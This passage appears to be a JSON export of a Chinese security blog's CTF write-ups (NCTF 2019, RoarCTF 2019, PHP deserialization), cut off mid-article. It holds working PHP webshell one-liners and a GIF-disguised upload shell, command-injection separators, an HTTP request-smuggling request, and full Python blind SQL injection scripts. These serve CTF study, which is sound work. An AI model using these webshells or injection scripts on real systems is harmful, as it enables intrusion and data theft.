webshell到web目录涉及到一些特殊字符的转义，假设需要写入<?php eval($_POST[kang]); ?>，方法如下：<br>WINDOWS：用^转义&lt;，即执行echo ^&lt;?php eval($_POST[kang]); ?^&gt; &gt; web可写目录加文件完整名字</p>\n<p>linux下需要用\\来转义&lt;，不过很多php都默认开启gpc（魔术引号magic_quotes_gpc()）。可以先用16进制转换一句话再用xxd命令把16进制还原，命令如下：<br>echo 3c3f706870206576616c28245f504f53545b6b616e675d293b203f3e|xxd -r -ps &gt; web可写目录加文件完整名字</p>\n<p>| 命令管道符</p>\n<p>&lt;&gt;&gt;&gt; 文件重定向符</p>\n<p>测试： 0 | dir c:</p>\n<p>　　代码只过滤了部分特殊字符，可以考虑用其他字符进行测试，这边列举一下Window/Linux可利用的特殊字符：</p>\n<p>windows支持：</p>\n<p>|     直接执行后面的语句      ping 127.0.0.1|whoami          </p>\n<p>||    前面出错执行后面的 ，前面为假       ping  2 || whoami </p>\n<p>&amp;   前面的语句为假则直接执行后面的,前面可真可假                       ping 127.0.0.1&amp;whoami</p>\n<p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真    ping 127.0.0.1&amp;&amp;whoami</p>\n<p>Linux支持(比上面多一个):</p>\n<p>;     前面的执行完执行后面的      ping 127.0.0.1;whoami  </p>\n<h3 id=\"upload-your-shell\"><a href=\"#upload-your-shell\" class=\"headerlink\" title=\"upload your shell\"></a>upload your shell</h3><p>打开题目在头像那里得 image 找到上传点，先上传</p>\n<pre><code>&lt;?php \n    @eval($_POST[shell]);\n     ?&gt;</code></pre><p>提示 <code>&lt;?</code> ，然后直接拿上次 SUCTF 用剩下得马</p>\n<pre><code>GIF89a\n&lt;script language=&apos;php&apos;&gt;\n    #system(&apos;cat /flag&apos;);\n    @eval($_POST[shell]);\n&lt;/script&gt;</code></pre><p>然后再修改 content-type ，传完得到图片路径，但是不能直接访问，观察到链接为 </p>\n<pre><code>http://nctf2019.x1ct34m.com:60002/index.php?action=menu.html </code></pre><p>于是访问</p>\n<pre><code>?action=upload-imgs/33498eb8814e110403efa2aebdff72d8/Th1s_is_a_fl4g.jpg</code></pre><p>即可</p>\n<h3 id=\"replace\"><a href=\"#replace\" class=\"headerlink\" title=\"replace\"></a>replace</h3><p>文字替换工具，hint：<code>使用php5.6+bootstrap进行开发</code> ，猜测 <code>preg_replace</code> 的 <code>/e</code> 代码执行。</p>\n<p>第三个框内的内容应该就是 /e的部分，我们输入 <code>var_dump(111)</code> ，成功打印 <code>int(111)</code> ，输入单引号双引号都会被过滤，可以利用 chr() 来绕过。</p>\n<p>我们输入scandir(chr(47)) 发现列不了目录。直接读文件 </p>\n<pre><code>file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103))//file_get_contents(&quot;/flag&quot;)</code></pre>","text":"NCTF11/26/2019 8:45:31 PM WEBFake XML cookbook简单的xxe&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [  &","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"}]},{"title":"SQL入门","slug":"SQL入门","date":"2019-08-02T01:43:50.000Z","updated":"2019-09-03T14:30:48.997Z","comments":true,"path":"api/articles/SQL入门.json","excerpt":"<p>Sql注入真的超神奇的，我怎么都学不会呢！<br>😀</p>","keywords":null,"cover":null,"content":null,"text":"Sql注入真的超神奇的，我怎么都学不会呢！<br>😀开始之前常用函数系统函数version() mysql版本user() 数据库用户名database() 数据库名@@datadir 数据库路径@@version_compile_os 操作系统版本字符串连接函数concat(","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"SQL","slug":"SQL","count":4,"path":"api/tags/SQL.json"}]},{"title":"RSA","slug":"RSA","date":"2018-05-23T07:13:47.000Z","updated":"2019-08-10T07:52:37.954Z","comments":true,"path":"api/articles/RSA.json","excerpt":"<p>我才二十出头，为什么要承受这么多…</p>","keywords":null,"cover":null,"content":null,"text":"我才二十出头，为什么要承受这么多…pubkey.pem文件构成Jarvis OJ mediumRSA为例下载文件我们得到了flag.enc和pubkey.pem，<br>使用openssl来获取公钥信息root@kali-ctf:~/RSA/mediumRSA# openssl ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"RSA","slug":"RSA","count":4,"path":"api/tags/RSA.json"}]},{"title":"ZIP's things","slug":"ZIP伪加密","date":"2019-03-23T07:13:47.000Z","updated":"2019-09-03T14:32:19.109Z","comments":true,"path":"api/articles/ZIP伪加密.json","excerpt":"<p>只要我E的够快，寂寞就追不上我！</p>\n<p>对不起，走错片场了~😄</p>","keywords":null,"cover":"http://wx4.sinaimg.cn/mw690/006boCb9ly1g5kazyuumnj30gx0de41x.jpg","content":null,"text":"只要我E的够快，寂寞就追不上我！对不起，走错片场了~😄##0x01 zip文件组成 ##压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志1 压缩源文件数据区在这个数据区中每个压缩文件的源文件/目录都是一条记录，记录格式如下[文件头+文件数据+数据描述符]文件头结构  ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"zip","slug":"zip","count":1,"path":"api/tags/zip.json"},{"name":"misc","slug":"misc","count":1,"path":"api/tags/misc.json"}]},{"title":"Session_unserlize","slug":"session-unserialize","date":"2019-08-01T11:33:07.000Z","updated":"2019-08-10T07:52:37.169Z","comments":true,"path":"api/articles/session-unserialize.json","excerpt":"<p>session的反序列化利用</p>","keywords":null,"cover":"http://wx1.sinaimg.cn/mw690/006boCb9ly1g5jyd32htkj30iv04dt8q.jpg","content":null,"text":"session的反序列化利用8/1/2019 10:44:57 AM 对魔法函数的再次认识常用方法__construct()//创建对象时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() /","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"},{"name":"serialize","slug":"serialize","count":4,"path":"api/tags/serialize.json"}]},{"title":"roarctf 2019","slug":"roarctf-2019","date":"2019-10-16T08:45:49.000Z","updated":"2019-11-06T13:13:29.498Z","comments":true,"path":"api/articles/roarctf-2019.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"roarctf-2019\"><a href=\"#roarctf-2019\" class=\"headerlink\" title=\"roarctf 2019\"></a>roarctf 2019</h1><p>10/16/2019 4:45:49 PM </p>\n<h2 id=\"easy-java\"><a href=\"#easy-java\" class=\"headerlink\" title=\"easy_java\"></a>easy_java</h2><p>拿到题目看到文件下载的接口，尝试 <code>/Download?filename=help.docx</code> ,发现没法下载，尝试下载网页上的照片发现也下载不了，后来就跑偏了，在想会不会是 <code>SSTI</code> ?fuzz了半天也没找到思路.  🎨</p>\n<p>改变请求方式为 <code>post</code> 即可成功下载到 <code>help.docx</code> ,里边没有什么有用的信息。 </p>\n<p>随便下载一个不存在的文件，得到报错信息里有服务器版本信息。做的时候就被难到的地方就是文件下载不知道下载什么东西。记得上次碰到这种题的时候还是 <code>SUCTF</code> 读 <code>nginx</code> 配置文件</p>\n<h3 id=\"什么是-WEB-INF\"><a href=\"#什么是-WEB-INF\" class=\"headerlink\" title=\"什么是 WEB-INF\"></a>什么是 WEB-INF</h3><blockquote>\n<p>WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>\n</blockquote>\n<ol>\n<li><p>/WEB-INF/web.xml</p>\n<p> Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p>\n</li>\n<li><p>/WEB-INF/classes/</p>\n<p> 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中（是该目录不能包含在.jar文件中）。</p>\n</li>\n</ol>\n<p>其他的配置文件介绍看<a href=\"https://baike.baidu.com/item/web-inf\" title=\"这里\" target=\"_blank\" rel=\"noopener\">https://baike.baidu.com/item/web-inf</a></p>\n<p>事实上就是在xml中配置好映射路径然后进行对某些含受保护内容文件的访问。</p>\n<p>我们访问 <code>WEB-INF/web.xml</code> 发现操作flag的关键配置</p>\n<p>按照映射关系访问 <code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code> 即可得到解密的字符串，base64解密即可</p>\n<h2 id=\"easy-calc\"><a href=\"#easy-calc\" class=\"headerlink\" title=\"easy_calc\"></a>easy_calc</h2><p>右键查看源码</p>\n<pre><code>&lt;?php\nerror_reporting(0);\nif(!isset($_GET[&apos;num&apos;])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET[&apos;num&apos;];\n        $blacklist = [&apos; &apos;, &apos;\\t&apos;, &apos;\\r&apos;, &apos;\\n&apos;,&apos;\\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\\[&apos;, &apos;\\]&apos;,&apos;\\$&apos;,&apos;\\\\&apos;,&apos;\\^&apos;];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) {\n                        die(&quot;what are you want to do?&quot;);\n                }\n        }\n        eval(&apos;echo &apos;.$str.&apos;;&apos;);\n}\n?&gt; </code></pre><p>有waf，这里有两种方法绕过：</p>\n<ol>\n<li>利用字符串解析特性 Bypass</li>\n</ol>\n<p>原理看这篇文章：<br><a href=\"https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/\" target=\"_blank\" rel=\"noopener\">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>\n<p>这里说一下大概意思<br> PHP 处理 GET or POST 请求时将查询字符串转换成数组 <code>/?foo=bar becomes Array([foo] =&gt; &quot;bar&quot;)</code> 。参数名里的一些字符会被移除或替换成下划线 <code>/?%20news[id%00=42 will be converted to Array([news_id] =&gt; 42)</code> 如果WAF规则是参数里含有一个非数值型的值时进行拦截时，我们就可以用下列语句绕过<code>/news.php?%20news[id%00=42&quot;+AND+1=0--</code> 它会被存储在 <code>$_GET[&quot;news_id&quot;]</code> 。</p>\n<p>这是测试php是如何处理特殊字符：</p>\n<pre><code>&lt;?php\nforeach(\n    [\n        &quot;{chr}foo_bar&quot;,\n        &quot;foo{chr}bar&quot;,\n        &quot;foo_bar{chr}&quot;\n    ] as $k =&gt; $arg) {\n    for($i=0;$i&lt;=255;$i++) {\n        echo &quot;\\033[999D\\033[K\\r&quot;;\n        echo &quot;[&quot;.$arg.&quot;] check &quot;.bin2hex(chr($i)).&quot;&quot;;\n        parse_str(str_replace(&quot;{chr}&quot;,chr($i),$arg).&quot;=bla&quot;,$o);\n        /* yes... I&apos;ve added a sleep time on each loop just for\n        the scenic effect :)\nlike that movie with unrealistic\n        brute-force where the password are obtained\n        one byte at a time (∩｀-´)⊃━☆ﾟ.*･｡ﾟ\n        */\n        usleep(5000);\n        if(isset($o[&quot;foo_bar&quot;])) {\n            echo &quot;\\033[999D\\033[K\\r&quot;;\n            echo $arg.&quot; -&gt; &quot;.bin2hex(chr($i)).&quot; (&quot;.chr($i).&quot;)\\n&quot;;\n        }\n    }\n    echo &quot;\\033[999D\\033[K\\r&quot;;\n    echo &quot;\\n&quot;;\n}</code></pre><p>这道题目经过测试参数前加一个 <code>%20</code>或者 <code>+</code> 来绕过</p>\n<ol start=\"2\">\n<li>http协议走私攻击</li>\n</ol>\n<blockquote>\n<p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p>\n</blockquote>\n<p>这里我们通过 CL-CL 来Bypass</p>\n<pre><code>POST /calc.php?num=phpinfo() HTTP/1.1\nHost: ********\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nConnection: keep-alive\nReferer: **********\nCookie: __cfduid=***********\nX-Forwarded-For: 127.0.0.1\nContent-Length: 7\nContent-Length: 7\nContent-Type: application/x-www-form-urlencoded\n\nnum=111</code></pre><p>绕过waf之后还禁掉了一些字符不能直接读到 flag 。</p>\n<p>先学习几个函数</p>\n<ul>\n<li>ord — 返回字符的 ASCII 码值</li>\n<li>bin2hex — 函数把包含数据的二进制字符串转换为十六进制值</li>\n<li>hex2bin — 转换十六进制字符串为二进制字符串</li>\n<li>dechex — 十进制转换为十六进制</li>\n<li>base_convert — 在任意进制之间转换数字</li>\n<li>hexdec — 十六进制转换为十进制</li>\n</ul>\n<p>读取flag</p>\n<pre><code>?+num=file_get_contents(hex2bin(dechex(52115961636711)))</code></pre><h2 id=\"Online-Proxy\"><a href=\"#Online-Proxy\" class=\"headerlink\" title=\"Online Proxy\"></a>Online Proxy</h2><p>打开靶机，抓包发现响应头</p>\n<pre><code>&lt;!-- Debug Info: \n Duration: 0.058279037475586 s \n Current Ip: 127.0.0.1 </code></pre><p>在 XFF 处尝试修改内容，发现可以修改成功。<code>Current Ip</code> 处显示当前的 XFF值，<code>Last Ip</code> 显示上次查询内容。执行 sleep() 语句 <code>1&#39; and sleep(3) and 1=&#39;1</code> 发现在第二次进行修改发包之后成功执行，存在二次注入。</p>\n<p>所谓二次注入就是服务端在第一次接收脏数据时对数据进行了 <code>addslashes</code> 或 <code>mysql_escape_string</code>  处理，但是存入数据库时存的还是脏数据，于是在第二次查询时由于查询的是脏数据，信息仍然会泄露。</p>\n<p>查看源码：</p>\n<pre><code>header(&quot;Content-type: &quot;. $mime_type.&quot;; charset=UTF-8&quot;);\n$content = str_replace(&quot;&lt;a href=\\&quot;&quot;, &quot;&lt;a href=\\&quot;/?url=&quot;, $content);\n$content = str_replace(&quot;&lt;a href=&apos;&quot;, &quot;&lt;a href=&apos;/?url=&quot;, $content);\necho($content);\n$end = microtime(true);\n$time = $end - $start;\n$last_ip = &quot;&quot;;\n$result = query(&quot;select current_ip, last_ip from ip_log where uuid = &apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);\nif(count($result) &gt; 0) {\n    if($ip !== $result[0][&apos;current_ip&apos;]) {\n        $last_ip = $result[0][&apos;current_ip&apos;];\n        query(&quot;delete from ip_log where uuid=&apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);\n    } else {\n        $last_ip = $result[0][&apos;last_ip&apos;];\n    }\n}\nquery(&quot;insert into ip_log values (&apos;&quot;.addslashes($uuid).&quot;&apos;, &apos;&quot;.addslashes($ip).&quot;&apos;, &apos;$last_ip&apos;);&quot;);\ndie(&quot;\\n&lt;!-- Debug Info: \\n Duration: $time s \\n Current Ip: $ip &quot;.($last_ip !== &quot;&quot; ? &quot;\\nLast Ip: &quot;.$last_ip : &quot;&quot;).&quot; --&gt;&quot;);</code></pre><p>可以看到在查询到数据之后，如果 <code>$ip !== $result[0][&#39;current_ip&#39;]</code> 那么 <code>$last_ip = $result[0][&#39;current_ip&#39;];</code> ，随后将 last_ip 不带过滤的带入数据库中查询。</p>\n<p>所以我们注入的思路就是先将 exp 插入数据，然后再正常访问一次将数据带出。</p>\n<p>exp:</p>\n<pre><code>import requests\nfrom time import sleep\nurl = &quot;http://node3.buuoj.cn:28063/&quot;\ns = requests.session()\n\nre = s.get(url)\nname = &apos;&apos;\n&quot;&quot;&quot;\n# database name\n# current db : ctf\n# information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctf\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\n&quot;&quot;&quot;\n# table name\n# ctf : ip_log\n# F4l9_D4t4B45e : F4l9_t4b1e\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;F4l9_D4t4B45e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\n&quot;&quot;&quot;\n# column_name\n# F4l9_D4t4B45e.F4l9_t4b1e : F4l9_C01uMn\nfor i in range(1,20):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&apos;F4l9_D4t4B45e&apos;and table_name=&apos;F4l9_t4b1e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break</code></pre><p>这个太不优雅了，赵师傅的更优雅：</p>\n<pre><code>#!/usr/bin/env python3\n\nimport requests\n\ntarget = &quot;http://localhost:8302/&quot;\n\ndef execute_sql(sql):\n    print(&quot;[*]请求语句：&quot; + sql)\n    return_result = &quot;&quot;\n\n    payload = &quot;0&apos;|length((&quot; + sql + &quot;))|&apos;0&quot;\n    session = requests.session()\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n    start_pos = r.text.find(&quot;Last Ip: &quot;)\n    end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)\n    length = int(r.text[start_pos + 9: end_pos])\n    print(&quot;[+]长度：&quot; + str(length))\n\n    for i in range(1, length + 1, 5):\n        payload = &quot;0&apos;|conv(hex(substr((&quot; + sql + &quot;),&quot; + str(i) + &quot;,5)),16,10)|&apos;0&quot;\n\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n        start_pos = r.text.find(&quot;Last Ip: &quot;)\n        end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)\n        result = int(r.text[start_pos + 9: end_pos])\n        return_result += bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;)\n\n        print(&quot;[+]位置 &quot; + str(i) + &quot; 请求五位成功:&quot; + bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;))\n\n    return return_result\n\n\n# 获取数据库\nprint(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&quot;))\n\n# 获取数据库表\nprint(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos;&quot;))\n\n# 获取数据库表\nprint(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos; AND TABLE_NAME = &apos;F4l9_t4b1e&apos; &quot;))\n\n# 获取表中内容\nprint(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&quot;))</code></pre><p>这里用的是 <code>1&#39;|&#39;1&#39;|&#39;1</code> 然后异或也可以 <code>1&#39;^&#39;0&#39;^&#39;1</code></p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><blockquote>\n<p><a href=\"https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/\" target=\"_blank\" rel=\"noopener\">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/213359.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/web/213359.html</a></p>\n<p><a href=\"https://paper.seebug.org/1048/#32-cl-cl\" target=\"_blank\" rel=\"noopener\">https://paper.seebug.org/1048/#32-cl-cl</a></p>\n</blockquote>\n","text":"roarctf 201910/16/2019 4:45:49 PM easy_java拿到题目看到文件下载的接口，尝试 /Download?filename=help.docx ,发现没法下载，尝试下载网页上的照片发现也下载不了，后来就跑偏了，在想会不会是 SSTI ?fuzz了","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]},{"title":"xxe","slug":"xxe","date":"2019-08-17T07:23:51.000Z","updated":"2019-09-03T14:20:16.807Z","comments":true,"path":"api/articles/xxe.json","excerpt":"<p>一次简单的xxe学习~</p>","keywords":null,"cover":"https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png","content":null,"text":"一次简单的xxe学习~XXE定义实体&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTIT","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"xxe","slug":"xxe","count":1,"path":"api/tags/xxe.json"}]},{"title":"序列化与反序列化","slug":"序列化与反序列化","date":"2019-12-12T03:47:20.000Z","updated":"2020-05-05T06:02:50.440Z","comments":true,"path":"api/articles/序列化与反序列化.json","excerpt":"","keywords":null,"cover":"https://i.imgur.com/pBO7lBu.png","content":"<h1 id=\"序列化与反序列化\"><a href=\"#序列化与反序列化\" class=\"headerlink\" title=\"序列化与反序列化\"></a>序列化与反序列化</h1><h2 id=\"0x01为什么要序列化\"><a href=\"#0x01为什么要序列化\" class=\"headerlink\" title=\"0x01为什么要序列化\"></a>0x01为什么要序列化</h2><p>php允许保存一个对象方便以后重用，这个过程称为序列化。在传递变量的过程中有可能遇到变量值跨脚本传输的过程。比如文件结构是这样的：</p>\n<p><img src=\"https://i.imgur.com/pBO7lBu.png\" alt></p>\n<p>其中index.php代码如下：</p>\n<pre><code>&lt;?php \n@highlight_file(__FILE__);\nrequire_once(&apos;shield.php&apos;);\n$x = new Shield();\nisset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];\nif (!empty($g)) {\n    $x = unserialize($g);\n}\necho $x-&gt;readfile();\n?&gt;</code></pre><p>可以看出来$x就是跨脚本传输的变量。</p>\n<p>如果在一个脚本调用跨脚本传输的变量之前，前一个包含该变量的脚本已经执行结束所有的变量和内容都已经释放掉了，这时，我们不能让前一个脚本不断循环执行等待后面的脚本去调用。serialize和unserialize 就是解决这一问题的。serialize将变量转换为字符串并且在转换过程中保存当前变量的值;unserialize则将serialize生成的字符串变回成变量。</p>\n<p>看一个例子，简单的分析一下：</p>\n<pre><code>&lt;?php\nclass Test\n{\npublic $age = 0;\npublic $name = &apos;brain&apos;;\n\npublic function PrintInfo()\n{\n    echo &apos;[+]User: &apos;.$this-&gt;name .&apos;: is&apos; . $this-&gt;age .&apos;years old.&apos;;\n}\n}\n$user =  new Test();\n$user-&gt;age = 20;\n$user-&gt;name = &apos;Jack&apos;;\n$user-&gt;PrintInfo();\necho serialize($user);\n\n?&gt;</code></pre><p>输出结果如下</p>\n<p><img src=\"https://i.imgur.com/bqenWI4.png\" alt></p>\n<p>使用unserialize则会使这串<strong>字符串</strong>恢复成<strong>类对象</strong>。</p>\n<h2 id=\"魔法函数\"><a href=\"#魔法函数\" class=\"headerlink\" title=\"魔法函数\"></a>魔法函数</h2><p>一共有几个魔法函数需要注意，这是例子：</p>\n<pre><code>&lt;?php\nclass Test\n{\npublic $variable = &quot;BRAIN&quot;;\npublic $variable1 = &quot;BRAVO&quot;;\npublic function PrintVariable()\n{\n    echo $this-&gt;variable . &apos;&lt;br /&gt;&apos;;\n}\npublic function __construct()\n{\n    echo &apos;__construct&apos;.&apos;&lt;br&gt;&apos;;\n}\npublic function __destruct()\n{\n    echo &apos;__destruct&lt;br /&gt;&apos;;\n}\npublic function __wakeup()\n{\n    echo &apos;__wakeup&lt;br /&gt;&apos;;\n}\npublic function __sleep()\n{\n    echo &apos;__sleep&lt;br /&gt;&apos;;\n    return array(&apos;variable&apos; , &apos;variable1&apos;);\n}\n}    \n$obj = new Test();  //创建对象时调用__construct\n\n$serialized = serialize($obj); //序列化对象时调用__sleep\n\nprint(&apos;Serialized: &apos;.$serialized . &apos;&lt;br /&gt;&apos;);\n\n$obj2 = unserialize($serialized); //重建对象调用 __wakeup\n\n$obj2-&gt;PrintVariable(); //调用方法输出数据\n//脚本结束调用__destruct\n?&gt;</code></pre><p>这是执行结果：</p>\n<p><img src=\"https://i.imgur.com/Eb6Ax4I.png\" alt></p>\n<p>可以看到各个函数的执行顺序。</p>\n<h2 id=\"漏洞产生\"><a href=\"#漏洞产生\" class=\"headerlink\" title=\"漏洞产生\"></a>漏洞产生</h2><p>反序列化的危害就在于反序列化后的字符串参数被用户可控，从而在序列化之后造成不可预料的问题。</p>\n<p>拿一道ctf题举例，文件结构就是文章开头提到的结构</p>\n<pre><code>    idnex.php\n\n&lt;?php \n@highlight_file(__FILE__);\nrequire_once(&apos;shield.php&apos;);\n$x = new Shield();\nisset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];\nif (!empty($g)) {\n    $x = unserialize($g);\n}\necho $x-&gt;readfile();\n?&gt;\n\n\nshield.php\n\n&lt;?php\n//flag is in pctf.php\nclass Shield {\n    public $file;\n    function __construct($filename = &apos;&apos;) {\n        $this -&gt; file = $filename;\n    }\n    function readfile() {\n        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  \n        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\\\&apos;)==FALSE) {\n            return @file_get_contents($this-&gt;file);\n        }\n    }\n}\n?&gt;</code></pre><p>我们可以看到index.php中先包含了shield.php，然后创建了一个新对象，在判断完get的变量之后进行反序列化，随后调用readfile()函数。<br>在shield.php中提示flag在pctf.php中，随后在readfile()函数中对$file进行一定过滤之后读文件内容。</p>\n<p>我们的想法就是控制$file的值为pctf.php</p>\n<pre><code>&lt;?php\n//flag is in pctf.php\nclass Shield {\n    public $file;\n    function __construct($filename = &apos;&apos;) {\n        $this -&gt; file = $filename;\n    }\n    function readfile() {\n        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  \n        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\\\&apos;)==FALSE) {\n            return @file_get_contents($this-&gt;file);\n        }\n    }\n}\n$a = new Shield(&quot;pctf.php&quot;);\necho serialize($a);\n?&gt;\n序列化结果\nO:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>然后我们就可以尝试传入这个字符串</p>\n<pre><code>class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>就可以在源码中看到flag.</p>\n<p><img src=\"https://i.imgur.com/rAYet4u.png\" alt></p>\n<h2 id=\"ROP-Return-Oriented-programming-链\"><a href=\"#ROP-Return-Oriented-programming-链\" class=\"headerlink\" title=\"ROP(Return-Oriented programming)链\"></a>ROP(Return-Oriented 